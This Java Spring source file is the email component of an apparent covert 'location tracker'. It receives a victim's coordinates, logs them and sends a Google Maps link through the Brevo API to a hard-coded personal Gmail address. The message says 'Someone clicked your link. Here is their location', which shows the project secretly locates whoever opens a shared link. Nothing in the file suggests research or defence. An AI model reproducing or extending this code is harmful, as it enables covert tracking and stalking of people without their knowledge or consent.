package com.example.locationtracker;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

@Service
public class EmailService {

    private static final Logger log = LoggerFactory.getLogger(EmailService.class);

    @Value("${BREVO_API_KEY}")
    private String apiKey;

    @Value("${spring.mail.username}")
    private String myEmail;

    public void sendLocationEmail(String latitude, String longitude) {
        String mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

        log.info("===> Captured Request Latitude: {}", latitude);
        log.info("===> Captured Request Longitude: {}", longitude);
        log.info("===> Captured Full Map URL: {}", mapsLink);

        try {
            // Build the JSON payload for the Brevo API
            String jsonPayload = """
                    {
                       "sender": { "name": "Location Tracker", "email": "%s" },
                       "to": [ { "email": "ranu97096@gmail.com" } ],
                       "subject": "New Location Alert!",
                       "textContent": "Someone clicked your link. Here is their location:\\n\\n%s"
                    }
                    """.formatted(myEmail, mapsLink);

            // Create the HTTP POST request to Brevo
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://api.brevo.com/v3/smtp/email"))
                    .header("accept", "application/json")
                    .header("api-key", apiKey)
                    .header("content-type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
                    .build();

            // Send the request
            HttpClient client = HttpClient.newHttpClient();
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            // Check if Brevo accepted the email
            if (response.statusCode() == 201) {
                log.info("===> Message sent successfully via Brevo HTTP API!");
            } else {
                log.error("===> Email failed. Brevo returned: {}", response.body());
            }
        } catch (Exception e) {
            log.error("===> HTTP Email request crashed: {}", e.getMessage(), e);
        }
    }
}